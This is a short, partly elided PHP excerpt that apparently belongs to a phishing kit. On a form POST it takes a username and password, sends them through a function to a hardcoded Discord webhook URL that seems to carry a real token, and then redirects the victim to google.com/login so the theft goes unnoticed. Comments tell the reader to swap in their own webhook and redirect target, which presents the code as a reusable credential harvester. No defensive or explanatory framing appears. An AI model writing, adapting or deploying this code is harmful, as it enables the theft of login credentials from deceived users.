...
function sendToDiscordWebhook($data) {
    $webhookUrls = [
        'https://discord.com/api/webhooks/1504465668857139333/GLcbB1gHScPF0kf84ccTWAtjF3hBhFgjJo4Z0E39AJz6tDCwmJnzLLlMBvs-tH8idmIE',  // Replace with your actual Discord webhook URL
    ];
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if (!empty($username) && !empty($password)) {
        ...
        header('Location: https://google.com/login'); // You can change it to anything
        exit();
    }
}
